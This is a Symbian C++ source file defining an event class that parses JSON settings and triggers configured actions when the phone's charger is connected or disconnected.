/*
 * EventAc.cpp
 *
 *  Created on: 26/set/2010
 *      Author: Giovanna
 */

#include "EventAc.h"
#include "Json.h"

CEventAc::CEventAc(TUint32 aTriggerId) :
	CAbstractEvent(EEvent_AC, aTriggerId),iBatteryInfoPckg(iBatteryInfo)
	{
	// No implementation required
	}

CEventAc::~CEventAc()
	{
	__FLOG(_L("Destructor"));
	delete iPhone;
	__FLOG(_L("End Destructor"));
	__FLOG_CLOSE;
	} 

CEventAc* CEventAc::NewLC(const TDesC8& params, TUint32 aTriggerId)
	{
	CEventAc* self = new (ELeave) CEventAc(aTriggerId);
	CleanupStack::PushL(self);
	self->ConstructL(params);
	return self;
	}

CEventAc* CEventAc::NewL(const TDesC8& params, TUint32 aTriggerId)
	{
	CEventAc* self = CEventAc::NewLC(params, aTriggerId);
	CleanupStack::Pop(); // self;
	return self;
	}

void CEventAc::ConstructL(const TDesC8& params)
	{
	__FLOG_OPEN_ID("HT", "EventAc.txt");
	__FLOG(_L("-------------"));
	
	BaseConstructL(params);
		
	RBuf paramsBuf;
		
	TInt err = paramsBuf.Create(2*params.Size());
	if(err == KErrNone)
		{
		paramsBuf.Copy(params);
		}
	else
		{
		//TODO: not enough memory
		}
		
	paramsBuf.CleanupClosePushL();
	CJsonBuilder* jsonBuilder = CJsonBuilder::NewL();
	CleanupStack::PushL(jsonBuilder);
	jsonBuilder->BuildFromJsonStringL(paramsBuf);
	CJsonObject* rootObject;
	jsonBuilder->GetDocumentObject(rootObject);
	if(rootObject)
		{
		CleanupStack::PushL(rootObject);
		//retrieve exit action
		if(rootObject->Find(_L("end")) != KErrNotFound)
			{
			rootObject->GetIntL(_L("end"),iAcParams.iExitAction);
			}
		else
			iAcParams.iExitAction = -1;
			
		//retrieve repeat action
		if(rootObject->Find(_L("repeat")) != KErrNotFound)
			{
			rootObject->GetIntL(_L("repeat"),iAcParams.iRepeatAction);
			rootObject->GetIntL(_L("iter"),iAcParams.iIter);
			rootObject->GetIntL(_L("delay"),iAcParams.iDelay);
			}
		else
			{
			iAcParams.iRepeatAction = -1;
			iAcParams.iIter = 0;
			iAcParams.iDelay = 0;
			}
		CleanupStack::PopAndDestroy(rootObject);
		}

	CleanupStack::PopAndDestroy(jsonBuilder);
	CleanupStack::PopAndDestroy(&paramsBuf);

	iPhone = CPhone::NewL();
	iPhone->SetObserver(this);
	__FLOG(_L("End ConstructL"));
	}

void CEventAc::StartEventL()
	{
	__FLOG(_L("StartEventL()"));
	
	// Initialize Properly the iWasConnectedToCharger value, 
	iWasConnectedToCharger = ConnectedToCharger();
	
	if(iWasConnectedToCharger)
		{
		__FLOG(_L("I was connected to charger"));
		SendActionTriggerToCoreL();
		}
	
	// Receives change notifications of the battery status
	iPhone->NotifyBatteryStatusChange(iBatteryInfoPckg);
	
	}

TBool CEventAc::ConnectedToCharger()
	{
	__FLOG(_L("ConnectedToCharger()"));
	
	TChargerStatus chargerStatus;
	iPhone->GetAcIndicatorSync(chargerStatus);
		
	if(chargerStatus == EChargerStatusUnknown)
		{
		// retrieve the info via battery info
		TUint chargeLevel=0;
		CTelephony::TBatteryStatus batteryStatus;
		iPhone->GetBatteryInfoSync(chargeLevel, batteryStatus);
		if((batteryStatus == CTelephony::EBatteryConnectedButExternallyPowered) || (batteryStatus == CTelephony::ENoBatteryConnected))
			return ETrue;
		else
			return EFalse;
		}
	else if(chargerStatus == EChargerStatusConnected)
		{
		return ETrue;
		}
	return EFalse;
	}


void CEventAc::HandlePhoneEventL(TPhoneFunctions event)
	{
	__FLOG(_L("HandlePhoneEventL"));
	
	if (event != ENotifyBatteryStatusChange)
		return;

	if (ConnectedToCharger())
		{
		// connected
		// Before trigger the event perform an additional check, just in case.
		if (!iWasConnectedToCharger)
			{
			// Triggers the In-Action
			iWasConnectedToCharger = ETrue;
			SendActionTriggerToCoreL();
			}
		}
	else
		{
		// not connected
		if (iWasConnectedToCharger)
			{
			// Triggers the unplug action
			iWasConnectedToCharger = EFalse;
			if (iAcParams.iExitAction != -1)
				{
				SendActionTriggerToCoreL(iAcParams.iExitAction);
				}
			}
		}
	iPhone->NotifyBatteryStatusChange(iBatteryInfoPckg);
	}
